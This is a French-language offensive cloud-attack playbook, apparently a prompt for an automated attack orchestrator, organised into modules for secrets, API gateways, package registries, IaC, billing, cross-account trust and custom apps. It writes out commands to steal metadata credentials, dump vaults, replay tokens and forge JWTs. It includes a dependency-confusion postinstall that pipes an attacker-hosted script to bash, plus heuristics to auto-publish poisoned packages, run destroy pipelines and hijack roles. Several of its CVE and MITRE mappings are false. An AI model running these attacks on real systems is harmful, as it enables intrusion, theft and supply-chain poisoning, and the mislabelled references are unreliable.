| **Vaults Cloud** | `aws secretsmanager list-secrets`, `gcloud secrets list`, `az keyvault list` |
| **Buckets publics** | `s3scanner`, `gsutil ls`, `az storage blob list` |
| **Fichiers exposés** | `find . -name '*.env'`, `.npmrc`, `.git-credentials` |

---

## 💣 PHASE 2 — TECHNIQUES D’EXFILTRATION

### 1. **API Metadata abuse**
```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Récupération des STS tokens AWS dans EC2
```

### 2. **Dump vault contents**
```bash
aws secretsmanager get-secret-value --secret-id <id>
gcloud secrets versions access latest --secret=<id>
az keyvault secret show --vault-name <vault> --name <key>
```

### 3. **Scan secrets dans repos**
```bash
trufflehog --regex --entropy=True https://github.com/org/test.git
gitleaks detect --source .
```

### 4. **Replay tokens dans Cloud APIs**
```bash
aws s3 ls --profile compromised
az storage blob download --container-name secrets
gcloud auth activate-service-account --key-file=<json>
```

---

## 🛠 OUTILS DE PENTEST DES SECRETS CLOUD

| Outil            | Fonction principale |
|------------------|---------------------|
| `trufflehog`     | Recherche de secrets dans Git ou artefacts |
| `gitleaks`       | Scan de secrets dans historique de code |
| `aws-nuke`       | Détection de secrets + suppression |
| `vault_scanner`  | Enum HashiCorp Vaults |
| `envhunter`      | Scan récursif de variables d’environnement |
| `token-hound`    | Dump et test de tokens exposés |
| `cloudfox`       | Recon IAM / secrets AWS |

---

## 🧠 PHASE 3 — RAISONNEMENT HEURISTIQUE

```pseudo
IF secrets found in Lambda envVar AND linked_to_prod:
    → Trigger rotation_alert()
    → Test with aws sts get-caller-identity
    → Execute privilege escalation chain (if perms)

IF token in metadata_api AND expired = False:
    → Trigger lateral_move_modules()

IF vault misconfigured OR public access:
    → Trigger vault_dump + dump_and_replay()

IF .env or .git-credentials in repo:
    → Trigger secrets_replay_in_auth()

ELSE:
    → Générer rapport d'exposition confidentiel
```

---

## 🔒 CVE / MITRE / CPE MAPPING

| MITRE ID | Tactique |
|----------|----------|
| T1552.001 | Secrets in code/config |
| T1552.004 | Cloud Vault abuse |
| T1528     | Abuse metadata API |
| T1078.004 | Stolen Cloud Credentials |
| T1087     | Account Discovery with secrets |

| CVE                  | Description |
|----------------------|-------------|
| CVE-2020-8911        | GCP SecretManager disclosure |
| CVE-2021-21300       | GitHub repo → secrets exfil |
| CVE-2021-26855       | SSRF → Token dump (Exchange ProxyLogon) |
| CVE-2019-1020006     | Jenkins pipeline secrets leakage |
| CVE-2020-8554        | K8s Metadata hijack in cloud pod |

---

## 📂 OUTPUT STRUCTURE

```plaintext
/output/cloud/secrets/<target>/tokens_found.txt
/output/cloud/secrets/<target>/vault_dump.json
/output/cloud/secrets/<target>/exfil_success.log
/output/cloud/secrets/<target>/mitre_mapping.md
/output/cloud/secrets/<target>/rotation_advice.md
```

---

## 📦 SCRIPTS GÉNÉRÉS AUTOMATIQUEMENT

```bash
secret_enum.sh                # Multi-provider secrets enumeration
vault_dump_trigger.py         # AWS/GCP/Azure dump secrets
envvar_scan_lambda.sh         # Enum env + grep secrets
metadata_token_extractor.sh   # Curl cloud instance metadata abuse
token_replay_executor.sh      # STS / OAuth2 / JWT token reuse
```

---

## 🧠 MODULE : `engine_cloud_api_gateway()`

### 🎯 OBJECTIF :

Effectuer une attaque exhaustive et modulaire sur les services API Gateway dans les Cloud Providers (AWS/GCP/Azure) en exploitant :

- Endpoints exposés
- JWT mal configurés
- Clés API codées en dur ou partagées
- Failles CORS / SSRF / IDOR / Auth Bypass
- Mauvais throttling / quotas absents
- Configuration d’accès permissive ou erronée
- Enumeration automatique avec analyse contextuelle des méthodes exposées

---

## 🧬 TYPE_ABSTRAIT : `APIGatewayContext`

```plaintext
APIGatewayContext {
  provider: AWS | Azure | GCP,
  apis: [APIObject],
  keys: [string],
  jwt_detected: boolean,
  cors_misconfig: boolean,
  endpoints: [Endpoint],
  rate_limit_detected: boolean,
  auth_type: Cognito | IAM | APIKey | OAuth2 | None,
  methods: [GET | POST | PUT | DELETE | OPTIONS | PATCH],
  metadata_exposure: boolean,
  vulnerable_payloads: [string]
}
```

---

## 🛰️ PHASE 1 — ENUMÉRATION INITIALE DES APIS

| Technique | Commandes & outils |
|-----------|---------------------|
| **AWS**   | `aws apigateway get-rest-apis`, `aws apigateway get-resources` |
| **GCP**   | `gcloud api-gateway apis list` |
| **Azure** | `az apim api list`, `az apim show` |
| **Recon** | `wfuzz`, `ffuf`, `gobuster`, `nuclei`, `Postman`, `Insomnia` |
| **Passif**| `crt.sh`, `shodan`, `censys`, `hunter.io` |

---

## 🛡️ PHASE 2 — TESTS D’EXPLOITATION DES ENDPOINTS

| Vulnérabilité | Méthode |
|---------------|---------|
| **Auth Bypass**   | `POST /admin` sans Auth header |
| **JWT manipulation** | HS256 → none / key forgery |
| **API Key leakage**  | Clés exposées dans code ou variables |
| **CORS misconfig**   | Origin wildcards, `Access-Control-Allow-Origin: *` |
| **Rate Limit absent**| Fuzz rapide via `ffuf`, `slowloris`, `ab` |
| **IDOR**             | `/user/12345 → /user/12346` accessible |
| **Verb Tampering**   | `GET → POST → OPTIONS` manipulation |
| **Cache Poisoning**  | Via `X-Forwarded-Host` ou `Host:` |
| **SSRF**             | Param → `?url=http://169.254.169.254`

---

## 🔨 OUTILS RECOMMANDÉS

| Outil           | Fonction |
|-----------------|----------|
| `nuclei`        | Scans API & CORS |
| `jwt_tool`      | JWT fuzz & abuse |
| `kiterunner`    | Discovery bruteforce |
| `ffuf`          | Fuzz de paramètres |
| `hoppscotch`    | Test manuel de flux |
| `burpsuite`     | Fuzzing, replay, auth chain |
| `aws_hound`     | Recon API AWS |
| `Postman`       | Replay de JWT, Auth, Keys |
| `Boomerang`     | Abuse OAuth2 flows |

---

## 🧬 EXEMPLES DE SCÉNARIOS

### 🔐 **JWT None Algo**

```bash
jwt_tool original.jwt -X -I -d none
Authorization: Bearer <modified_token>
```

### 🔁 **Replay API Keys sur endpoints**

```bash
curl -H "x-api-key: abc123" https://api.example.com/admin
```

### 🔧 **CORS Wildcard Test**

```bash
curl -H "Origin: evil.com" -I https://api.target.com
```

### 🕳 **IDOR Bruteforce**

```bash
ffuf -u https://api.site.com/user/FUZZ -w ids.txt -H "Authorization: Bearer X"
```

### 🧩 **SSRF in parameter**

```bash
curl https://api.site.com?target=http://169.254.169.254
```

---

## 📈 HEURISTIQUE STRATÉGIQUE

```pseudo
IF endpoints include /admin AND auth_type = None:
    → trigger auth_bypass_fuzz()

IF CORS misconfig = true AND wildcard:
    → trigger origin_injection()

IF JWT present AND algo = none:
    → trigger jwt_forge()

IF replay key → access success:
    → alert APIKey leakage

IF rate limiting absent:
    → trigger DoS_throttle_fuzz()

IF endpoint names = predictable pattern:
    → trigger IDOR_fuzz()
```

---

## 🔐 CVE / MITRE / CPE MAPPING

| CVE                  | Description |
|----------------------|-------------|
| CVE-2020-8648        | API Gateway token leakage |
| CVE-2021-29156       | CORS misconfiguration |
| CVE-2021-23336       | SSRF via redirect param |
| CVE-2022-24891       | Auth bypass due to routing flaw |
| CVE-2023-27585       | Key injection in headers |

| MITRE                | Description |
|----------------------|-------------|
| T1190                | Exploit Public-Facing Application |
| T1078.004            | Use of stolen API keys |
| T1552.001            | Secrets in source / config |
| T1199                | Trusted relationship abuse |
| T1056                | Input Capture / Endpoint sniff |

---

## 📁 OUTPUTS STRUCTURÉS

```plaintext
/output/cloud/api_gateway/<target>/endpoint_map.json
/output/cloud/api_gateway/<target>/auth_test_results.txt
/output/cloud/api_gateway/<target>/token_forge_results.log
/output/cloud/api_gateway/<target>/nuclei_cors.log
/output/cloud/api_gateway/<target>/ssrf_exploits.txt
```

---

## 🧰 SCRIPTS AUTOGÉNÉRÉS

```bash
api_enum.sh                    # API endpoint enumeration (multi-cloud)
jwt_forge.sh                   # Modifie le header JWT HS256 / none
cors_misconfig_test.py         # Scan large CORS surface
idor_fuzzer.sh                 # Brute-force predictable IDs
apikey_replay.sh               # Test key reuse across methods
rate_limit_dos.sh              # Bench endpoints with no throttle
```

---

## 🧠 MODULE : `engine_cloud_package_registry()`

### 🎯 OBJECTIF :

Attaquer les systèmes de gestion de packages dans le cloud et les chaînes de dépendance avec :

- Discovery automatique des repos publics/privés
- Analyse de la politique de versioning
- Confusion entre namespaces (public vs private)
- Poisoning de dépendances
- Analyse des droits de push/pull
- Scripts `postinstall` malicieux
- Scan des artifacts pour secrets/API Keys
- Injection dans des workflows CI/CD

---

## 🧬 TYPE_ABSTRAIT : `PackageRegistryContext`

```plaintext
PackageRegistryContext {
  provider: AWS | Azure | GCP | GitHub | Docker | Other,
  registry_type: npm | pip | docker | nuget | maven | gem | go,
  access_type: public | private | mixed,
  misconfigured_scopes: [string],
  pull_rights_open: boolean,
  push_rights_open: boolean,
  typosquatting_candidates: [string],
  versions: [Version],
  ci_scripts_found: boolean,
  postinstall_scripts: [string],
  secrets_in_packages: boolean,
  metadata_exposure: boolean
}
```

---

## 🔍 PHASE 1 — DISCOVERY & ENUMÉRATION

| Contexte             | Outils / Commandes |
|----------------------|--------------------|
| GitHub Packages      | `gh api`, `gobuster`, GitHub dorks |
| AWS CodeArtifact     | `aws codeartifact list-packages` |
| Azure Artifacts      | `az artifacts universal download`, `az acr` |
| Docker Registries    | `crane`, `docker pull`, `docker inspect`, `registry scan` |
| Public Repos (npm)   | `npm view`, `npm audit`, `npm info <name>` |
| pip                 | `pip install <name>`, `pip show` |

---

## 🧨 PHASE 2 — ATTACK PATTERNS

### 🕵️‍♂️ DEPENDENCY CONFUSION

- Créer un package malicieux `@corp/utils` sur npm
- Inject payload dans `postinstall`
- Upload → si pipeline CI/CD vulnérable → exécution

```bash
npm publish --access public
# avec dans package.json
"scripts": {
  "postinstall": "curl attacker/malware.sh | bash"
}
```

### 🔒 DROITS DE PULL/PUSH

- `docker pull repo/image` depuis registry public
- `aws ecr get-login-password | docker login`
- Tentative de push non autorisée pour tester contrôle d’accès

```bash
docker push vulnrepo/backdoored:latest
```

### 🧬 METADATA LEAK

- `npm info <target>` → récupération mail, scope privé
- `pip install -v <package>` → logs des scripts

---

## 📦 PHASE 3 — ARTIFACT ABUSE & STATIC ANALYSIS

| Type    | Action |
|---------|--------|
| **Docker** | `trivy`, `dockle`, `grype`, `syft`, `clamav` |
| **npm/pip** | `semgrep`, `npm audit`, `bandit`, `yara` |
| **GitHub Packages** | `gitleaks`, `gitrob`, `trufflehog`, `osv-scanner` |

```bash
trivy image registry.cloud.io/team/repo:latest
semgrep --config auto ./package
grep -r 'AKIA' ./package
```

---

## 🧪 PHASE 4 — CI/CD INJECTION (GitHub / GitLab / AWS Pipelines)

- Abus des packages via scripts `postinstall`
- Ajout de step dans `.gitlab-ci.yml` ou `.github/workflows`
- Lien vers `engine_cloud_ci_cd_pipelines()`

---

## ⚙️ AUTOMATION & SCRIPTS

```bash
registry_enum.sh           # Énumération de tous les registries accessibles
docker_scan_artifact.sh    # Trivy + Dockle + Grype sur images Docker
dependency_confuse.sh      # Génération d’un faux package + publish
secret_hunter.sh           # Gitleaks / trufflehog sur archives
access_check.sh            # Tests de push/pull
```

---

## 📊 HEURISTIQUE STRATÉGIQUE

```pseudo
IF registry_type = npm OR pip AND access_type = public:
    → trigger dependency_confusion()

IF docker registry = public AND push_rights = true:
    → trigger artifact_poison()

IF postinstall scripts detected AND CI/CD exposed:
    → trigger ci_injection()

IF artifact contains AWS Keys:
    → trigger cloud_creds_exfil()

IF multiple typosquatting candidates exist:
    → auto-publish poisoned packages

IF semgrep/yara detect exec() or subprocess():
    → alert malicious logic in package
```

---

## 🧩 CVE / CPE / MITRE MAPPING

| CVE                   | Description |
|------------------------|-------------|
| CVE-2021-23406         | Malicious NPM scripts via `prepare` |
| CVE-2021-32617         | PyPI package with embedded credentials |
| CVE-2021-26291         | Apache Maven vulnerable to dependency confusion |
| CVE-2022-21661         | Docker pull from GitHub registry bypass ACLs |
| CVE-2022-29181         | Actions injection via registry hijack |

| MITRE TTP             | Usage |
|-----------------------|--------|
| T1195.001             | Supply Chain Compromise |
| T1552.001             | Secrets in Code |
| T1059.004             | PowerShell / Script abuse |
| T1588.002             | Code Signing abuse |
| T1210                 | Exploit Remote Services (Docker Registry, GitHub) |

---

## 📁 OUTPUT STRUCTURÉ

```plaintext
/output/cloud/registry/<target>/metadata_scan.json
/output/cloud/registry/<target>/dependency_confuse.log
/output/cloud/registry/<target>/leaked_keys.txt
/output/cloud/registry/<target>/image_analysis.md
/output/cloud/registry/<target>/ci_cd_poison_summary.txt
```

---

## ⚙️ MODULE : `engine_cloud_infra_as_code()`

---

### 🎯 OBJECTIF

Auditer et exploiter les templates et pipelines d’infrastructure codée (IaC) tels que :

- Terraform (`.tf`)
- AWS CloudFormation (`.yaml`, `.json`)
- Azure ARM templates
- Pulumi
- Helm charts (Kubernetes)
- Serverless framework (`serverless.yml`)
- Ansible playbooks
- Dockerfiles

---

## 🧬 TYPE_ABSTRAIT : `IaCAssetContext`

```plaintext
IaCAssetContext {
  provider: AWS | Azure | GCP | OCI | Other,
  format: Terraform | CloudFormation | ARM | Pulumi | Helm | Ansible | Dockerfile,
  has_secrets: boolean,
  has_hardcoded_keys: boolean,
  allows_wildcard_permissions: boolean,
  public_resources: [string],
  unmanaged_dependencies: boolean,
  drift_with_state: boolean,
  tf_state_exposed: boolean,
  ci_cd_linked: boolean,
  abuse_chains: [string]
}
```

---

## 🧪 PHASE 1 — RECONNAISSANCE / ENUM

| Action                                  | Outils                                |
|----------------------------------------|----------------------------------------|
| Scan fichiers `.tf`, `.yaml`, `.json`  | `tflint`, `checkov`, `tfsec`, `kics`  |
| Secrets et clés                        | `trufflehog`, `gitleaks`, `detect-secrets` |
| Énumération de variables dangereuses   | `yq`, `jq`, regex YARA                 |
| Scan de GitHub repos IaC               | `osv-scanner`, `gitrob`, `repo-supervisor` |
| Analyse Drift                          | `infracost`, `terraform show`, `plan` |

---

## 🔥 PHASE 2 — VECTEURS D’EXPLOITATION & ABUS

### 🔓 Permissions larges

```hcl
resource "aws_iam_policy" "bad_policy" {
  policy = jsonencode({
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }]
  })
}
```

→ Déclenche :
- `exploit_wildcard_permissions()`
- `trigger_iam_privesc_chains()`

### 🧑‍💻 Secrets hardcodés

- Détection dans `provider`, `module`, `locals`
- Script auto extraction :

```bash
grep -r -E '(AKIA|AIza|azure_token)' .
trufflehog filesystem . --json > secrets.json
```

### 🌍 Ressources publiques (S3, RDS, EC2, LB...)

- `checkov` détecte : `public = true`, `0.0.0.0/0`
- `terraform plan` + `grep 0.0.0.0`
- Abus des ingress non filtrés (ALB → SSRF)

---

## 🧠 PHASE 3 — ANALYSE DE DRIFT / DRIFT ABUSE

- Fichiers `.tfstate` exposés dans S3 public
- `terraform show` + `terraform refresh` pour détecter dérives
- `terraform output` → extraction clés ou URLs

---

## 🧨 PHASE 4 — CI/CD / PIPELINE ABUSE

- Détection des hooks Terraform dans GitLab, GitHub Actions
- Si `auto-approve` ou `destroy` autorisé :
  - `terraform destroy` via pipeline
  - Abus de `plan` automatique

---

## 🧬 PHASE 5 — ABUS DE PROVIDERS & MODULES TIERS

- Repo GitHub non maintenu utilisé dans `source`
- Pas de versioning ou checksum (`ref = main` sans sha256)
- `terraform get` auto-update → injection supply chain

---

## ⚙️ SCRIPTS ET AUTOMATION

```bash
iac_enum.sh               # Lister tous les fichiers IaC et dépendances
iac_secretscan.sh         # trufflehog + gitleaks
iac_checkov_tfsec.sh      # analyse statique
iac_cicd_poison.sh        # abus dans les scripts auto-apply
iac_tfstate_abuse.sh      # extraction depuis fichier .tfstate
```

---

## 🔁 HEURISTIQUE STRATÉGIQUE

```pseudo
IF resource.public = true AND port_open = 22 OR 80:
    → scan_and_exploit_public_service()

IF wildcard_permissions == true:
    → trigger_iam_escalation()

IF secrets_detected == true:
    → extract + use token to auth cloud()

IF provider_source = unpinned_github_repo:
    → create poisoned PR → trigger auto-fetch

IF .tfstate = accessible:
    → extract credentials, IPs, resource ID

IF tfvar contains cleartext password:
    → raise alert + auto-decrypt
```

---

## 📌 CVE / MITRE / CPE CORRÉLATION

| CVE                   | Description |
|------------------------|-------------|
| CVE-2021-44228         | Log4Shell embedded in IaC container setup |
| CVE-2022-25857         | Terraform plugin vuln path injection |
| CVE-2023-36884         | Supply Chain IaC via poisoned module |
| CVE-2021-42342         | Docker-compose local privilege escalation via .env |

| MITRE                 | Tactic |
|------------------------|--------|
| T1134                 | Access Token Manipulation |
| T1552.001             | Secrets in IaC |
| T1210                 | Remote Service Exploit |
| T1059.004             | IaC → Shell injection |
| T1588.002             | Abuse repo in CI/CD IaC pull

---

## 📁 OUTPUT STRUCTURÉ

```plaintext
/output/cloud/iac/secrets_found.json
/output/cloud/iac/public_resources.md
/output/cloud/iac/tf_plan_anomalies.log
/output/cloud/iac/abuse_paths.txt
/output/cloud/iac/cicd_hooks_poisoned.log
```

---

## ⚙️ MODULE : `engine_cloud_billing_abuse()`

---

### 🎯 OBJECTIF

Détecter les vecteurs d'abus du système de **facturation cloud** d’une cible, y compris :
- Exfiltration des usages
- Abuse des crédits gratuits / promotions
- Generation de coûts fantômes
- Minage caché / exploitation CPU/GPU
- Utilisation illégitime de ressources spot/preemptible
- Emprunt de services tiers via cross-service relay
- Failles dans les policies de quota/billing alerts

---

### 🧬 TYPE_ABSTRAIT : `CloudBillingContext`

```plaintext
CloudBillingContext {
  provider: AWS | Azure | GCP | OVH | Other,
  has_cost_alerts: boolean,
  billing_api_accessible: boolean,
  abused_services: [string],
  over_quota_flags: boolean,
  anomaly_on_credit_consumption: boolean,
  free_tier_bypass_possible: boolean,
  suspected_crypto_activity: boolean,
  invoice_exports_enabled: boolean,
  abuse_patterns: [string]
}
```

---

## 🧪 PHASE 1 — ENUMERATION / RECONNAISSANCE

| Cible                             | Outils                       |
|----------------------------------|------------------------------|
| Billing API Enabled              | `aws ce`, `gcloud billing`, `az consumption` |
| IAM permissions audit            | `enumerate-iam`, `PMapper`, `steampipe`     |
| Factures disponibles             | `aws ce get-cost-and-usage`, `gcloud billing accounts list` |
| Exports vers bucket              | `check_bucket_acl.sh`, `s3ls`, `gsutil`     |
| Cross-account service listing    | `enumerate-linked-accounts.sh`, Terraform scan |
| Billing alerts configurées ?     | `aws cloudwatch describe-alarms`, `az monitor metrics alert list` |

---

## 🧨 PHASE 2 — STRATÉGIES D’ABUS

### 💰 Abuse du Free Tier
- Générer des millions de requêtes `Lambda`, `Cloud Functions` → dépassement soft quota
- Rotation de comptes / adresses / alias sur Cloud Trial
- Abuse des `Compute Engine` f1-micro ou `EC2` t2.nano gratuitement
- Script :
```bash
for i in {1..10000}; do curl https://target-free-endpoint.cloud.run; done
```

### 🏴‍☠️ Generation de coûts fantômes
- Créer des ressources à coût élevé avec API exposée (`AI Training`, `GPU`, `Fargate`, etc.)
- Exploit d’une fonction permissive dans un service délégué (Lambda avec IAM Role `ec2:RunInstances`)
- Scénario :
```bash
aws lambda update-function-configuration \
    --function-name victim-fn \
    --environment "Variables={AUTO_CREATE_INSTANCE=true,INSTANCE_TYPE=p4d.24xlarge}"
```

### 🧲 CryptoMining caché
- Utilisation de workloads batch / Kubernetes
- Auto-scheduling de pods pour miner XMR
- Abuse spot nodes sans monitoring
- Détection : Surveille les connexions sortantes vers `pool.*.xmr` / `stratum+tcp://`

---

## 🔁 HEURISTIQUE STRATÉGIQUE

```pseudo
IF invoice export enabled AND bucket public:
    → exfiltrate invoice
    → compare anomaly peaks

IF IAM policy allows billing:ListUsage:
    → collect all usage stats via API

IF Lambda free tier abuse possible:
    → stress + rotate → exceed threshold

IF role assume-policy includes wildcard services:
    → generate GPU/AI workload

IF usage spike in spot or Fargate:
    → trigger alert for crypto mining

IF trial account with unrestricted resource limits:
    → spin-up intensive services

IF CloudTrail log reveals disablement of billing alert:
    → alert abuse + possible sabotage
```

---

## 🔥 MAPPING MITRE / CVE / TTP

| MITRE ATT&CK ID  | Description |
|------------------|-------------|
| T1496            | Resource Hijacking (cloud compute abuse) |
| T1190            | Cloud API Misuse (Billing API exposed)   |
| T1588.002        | Abuse free trials for persistent abuse   |
| T1565.001        | Impact via Cost Generation               |
| T1562.001        | Disable Monitoring (Billing Alerts)      |

| CVE / Scénarios |
|-----------------|
| CVE-2022-30137 (Azure billing exposure via logs) |
| Misconfigured AWS CE API (billing:get-cost-and-usage without restriction) |
| Misuse des fonctions GCP BigQuery invoquant auto-exports coûteux |

---

## 🔐 OUTPUT STRUCTURÉ

```plaintext
/output/cloud/billing/cost_profile.json
/output/cloud/billing/abuse_simulation.log
/output/cloud/billing/crypto_mining_alert.md
/output/cloud/billing/iam_policy_loopholes.txt
```

---

## ⚙️ SCRIPTS

- `billing_scan.sh` → extract all cost & usage profiles
- `credit_abuse.sh` → simulate usage to exceed thresholds
- `gpu_stress.sh` → spin-up expensive resource workloads
- `detect_invoice_exposure.sh` → analyze buckets with exported invoices
- `mine_detector.sh` → detect known mining domains / wallet patterns

---

## 🌐 MODULE : `engine_cloud_cross_account()`

---

### 🎯 OBJECTIF

Détecter, abuser et compromettre les **liens intercomptes** entre environnements cloud (AWS, Azure, GCP, OVH), en ciblant :
- Trusts IAM inter-compte (assume-role, federated)
- Bucket/pipeline partagés
- Secrets, tokens ou workloads transitant d’un tenant à l’autre
- Chaine d’approvisionnement / intégration CI/CD intertenant
- Abus de ressources “shared” (KMS, VPC, peering)

---

## 🧬 TYPE_ABSTRAIT : `CrossAccountContext`

```plaintext
CrossAccountContext {
  source_account: string,
  target_accounts: [string],
  shared_resources: [ResourceRef],
  trust_relationships: [TrustPolicy],
  misconfigured_roles: [IAMRole],
  exposed_credentials: [CredentialLeak],
  attack_paths: [string],
  cross_provider_links: boolean
}
```

---

## 🧪 PHASE 1 — ENUMERATION

| Cible                        | Outils |
|-----------------------------|--------|
| Trust policies IAM (AWS)    | `enumerate-iam`, `CloudSploit`, `ScoutSuite` |
| Shared resources            | `steampipe`, `cloudmapper`, `PMapper`, `az role assignment list`, `gcloud projects get-iam-policy` |
| Artifact Repos partagés     | `check_gh_packages.sh`, `gitlabci_cross.sh`, `artifact_inventory.py` |
| Secrets partagés            | `TruffleHog`, `gitleaks`, `cloudsploit` |
| KMS / VPC peerings          | `aws ec2 describe-vpc-peering-connections`, `gcloud compute networks peerings list` |

---

## 🧨 PHASE 2 — STRATÉGIES D’ATTAQUE

### 🕳️ AssumeRole Abuse (AWS)
```bash
aws sts assume-role \
    --role-arn arn:aws:iam::TARGET_ACC_ID:role/AdminRole \
    --role-session-name EvilPentester \
    --external-id CompanyPartner1
```

→ Si ExternalId absent ou predictable → exfil accès root sur compte cible

### 🔁 Cross-Project IAM Weakness (GCP)
- `gcloud projects get-iam-policy` → détecte des bindings comme :
```
"members": [
  "serviceAccount:external-acc@external.iam.gserviceaccount.com"
]
```
→ Exploiter via token injection ou privilege escalation

### 🎣 Azure Cross-Subscription Elevation
- `az role assignment list` → trouve rôle Contributor sur d'autres subscriptions
- Abuse via `az account set --subscription <target>` + `az role assignment create`

---

## 🔁 STRATÉGIE HEURISTIQUE D’ATTAQUE

```pseudo
IF TrustPolicy allows wildcard or no ExternalId check:
    → simulate AssumeRole attack
    → persist via long-term token hijack

IF GCP IAM Binding to foreign serviceAccount:
    → token impersonation + resource access

IF GitHub / GitLab CI exposes environment to forks:
    → abuse for CI secrets exfiltration

IF Azure assigns Contributor to external AAD:
    → role escalation across subscription

IF shared bucket allows WRITE from another tenant:
    → plant malicious code (supply chain poisoning)
```

---

## 🔍 CVE / MITRE / TTP MAPPING

| Référence | Description |
|----------|-------------|
| T1078.004 | Cloud Account Abuse |
| T1098.001 | IAM Role Escalation |
| T1484.001 | Cross-Trust Escalation |
| T1580     | Cloud Infrastructure Compromise |
| CVE-2020-8835 | GitHub Actions external pull request leak |
| CVE-2022-32189 | Cross-project GCP SA abuse |

---

## 🔐 SCRIPTS À GÉNÉRER

```plaintext
cross_account_enum.sh          → IAM roles, shared buckets, peerings
assume_role_attack.sh         → simulate STS hijack AWS
azure_cross_role.sh           → abuse AAD contributor assignment
gcp_cross_token_hijack.py     → impersonate SA tokens GCP
ci_cross_secrets_exfil.sh     → GitHub/GitLab fork token leak
```

---

## 📁 OUTPUTS

```plaintext
/output/cloud/cross_account/assume_role_traces.json
/output/cloud/cross_account/priv_esc_path.md
/output/cloud/cross_account/secrets_from_ci.log
/output/cloud/cross_account/shared_buckets.txt
```

---

## 🧠 MODULE : `engine_cloud_custom_applications()`

---

### 🎯 OBJECTIF

Analyser, scanner et compromettre les **applications custom hébergées sur le cloud**, que ce soit :
- des microservices,
- des APIs serverless ou containerisées,
- des backends Java, Python, Node, .NET déployés sur des services managés (`App Engine`, `Elastic Beanstalk`, `App Services`…),
- des PWA, SPA, front-ends décorrélés.

> L’objectif est de **remonter toute la chaîne de valeurs**, de la surface exposée web/api jusqu’à la logique applicative, les rôles IAM liés, les données, les dépendances et le runtime.

---

## 🧬 TYPE_ABSTRAIT : `CustomAppContext`

```plaintext
CustomAppContext {
    cloud_provider: AWS | Azure | GCP | Other,
    deployment_type: AppService | Lambda | GAE | Docker | Kubernetes,
    code_exposed: boolean,
    env_variables: [string],
    public_endpoints: [string],
    linked_roles: [IAMRole],
    runtime: Node | Python | .NET | Java | Go | Other,
    attack_surface: {
        apis: [API],
        routes: [string],
        secrets_exposed: boolean,
        db_links: boolean,
        logging_exposed: boolean
    }
}
```

---

## 🧪 PHASE 1 — ENUMERATION

| Cible                         | Outils                        |
|------------------------------|-------------------------------|
| Liste des endpoints          | `amass`, `gau`, `subfinder`, `httpx` |
| Scan code exposé / debug     | `dirsearch`, `wappalyzer`, `whatweb`, `nuclei` |
| Enum App Services (Azure)    | `az webapp list`, `az webapp config appsettings list` |
| Enum GAE / GCF               | `gcloud app versions list`, `functions list` |
| Enum Beanstalk, Lambda       | `aws elasticbeanstalk describe-environments`, `aws lambda list-functions` |
| Dependency Audit             | `trivy`, `npm audit`, `pip-audit`, `dependency-check` |
| Secrets Exposés              | `gitleaks`, `secretlint`, `shhgit`, `cloudsploit` |

---

## 🧨 PHASE 2 — STRATÉGIES D’EXPLOITATION

### 🪝 SSRF / IDOR / Header Injection
- Tester les fonctions GET/POST/PUT → injection `Host`, `X-Forwarded-For`, etc.
- Exemple :
```bash
curl -H "Host: 169.254.169.254" https://api.custom.app/v1/user
```

### 🔐 JWT Abuse
- Test decoding / forging / none alg bypass → `jwt_tool`, `jose-jwt-cracker`, `authmatrix`

### 🧽 ENV Dump
- Tester `/env`, `/config`, `/__admin` pour fuite d’infos
- Si App Service Azure :
```bash
az webapp config appsettings list --name <appname>
```

### 🧨 Deserialization / RCE
- Via endpoint SOAP/XML ou payload encodé
- Frameworks vulnérables : Flask Pickle, Java Serialized, .NET BinaryFormatter

### 🧰 Exploit Runtime Vulnérable
- CVE liées au framework (ex: Spring4Shell, Log4Shell)
- CVE sur lib front : VueJS 2.x, Angular vulnérables à XSS persistants

---

## 🔁 STRATÉGIE HEURISTIQUE

```pseudo
IF code debug exposé OR /env accessible:
    → extract runtime info + creds + debug flag

IF public endpoint includes /api OR /graphql:
    → test for IDOR, injection, rate limit bypass

IF JWT used and alg="none":
    → forge token for privilege escalation

IF app containerized AND mounted volume:
    → inspect writeable paths + pivot to underlying host

IF IAM role linked:
    → trigger metadata access (AWS/GCP) + escalate via STS / service account
```

---

## 🔎 VULNÉRABILITÉS / MAPPING TACTIQUE

| CVE / Technique | Description |
|-----------------|-------------|
| CVE-2022-22965 (Spring4Shell) | RCE in Spring Core |
| CVE-2021-44228 (Log4Shell)    | RCE via JNDI         |
| T1557.003                     | Cloud Federation Abuse |
| T1190 / T1133                | Public App Entry Exploit |
| T1071.001                    | App-to-Cloud comms exfiltration |

---

## 🧰 OUTILS À DÉCLENCHER

- `burpsuite`, `ffuf`, `feroxbuster`
- `nuclei` + templates `technologies`, `misconfig`, `exposed-panels`
- `jwt_tool`, `sqlmap`, `xsstrike`
- `cloudfox`, `gcp_enum`, `azurehound`, `aws_pwn`

---

## 📁 OUTPUTS

```plaintext
/output/cloud/custom_app/routes_exposed.txt
/output/cloud/custom_app/jwt_escalation.log
/output/cloud/custom_app/env_dump.log
/output/cloud/custom_app/runtime_analysis.md
/output/cloud/custom_app/exploited_paths.dot
```

---

## ⚙️ SCRIPTS À GÉNÉRER

- `scan_exposed.sh` → full ffuf + nuclei + dirsearch
- `jwt_forge.py` → manipulate and sign custom JWT
- `debug_dump.py` → collect exposed env/config/public values
- `metadata_abuse.sh` → abuse cloud metadata endpoint
- `cloud_roles_scan.sh` → linked cloud role → privilege escalation

---

# ☁️ GIGAPROMPT FINAL ORCHESTRATEUR `engine_infra_cloud()`

---

## 🧠 TYPE_ABSTRAIT : HeuristicCloudEngine
```markdown
HeuristicCloudEngine {
    observe(target: CloudTarget) → Signal[],
    match(signal: Signal) → Hypothesis[],
    correlate(hypothesis: Hypothesis) → AttackPattern[],
    orchestrate(pattern: AttackPattern) → ModuleExecution[],
    execute(module: ModuleExecution) → Observation[],
    synthesize(observation: Observation[]) → ExploitChain[],
    react(chain: ExploitChain) → Script[],
    report(Script[]) → RapportFinal
}
```

---

## 🧱 TYPE_ABSTRAIT : CloudTarget
```markdown
CloudTarget {
    provider: string (AWS, Azure, GCP, etc.),
    region: string,
    services: [string],
    identity: [IAMRole, AccessKey, Federation],
    compute: [Lambda, EC2, AzureVM, GCE, EKS],
    storage: [S3, Blob, GCS, FSx],
    secrets: [Vaults, EnvVars],
    network: [VPC, NSG, Peering],
    ci_cd: [GitHub, GitLab, CodePipeline],
    api: [Gateway, ALB, WAF],
    metadata_exposure: boolean,
    telemetry: [CloudWatch, Logging],
    score: {impact: number, exploitability: number}
}
```

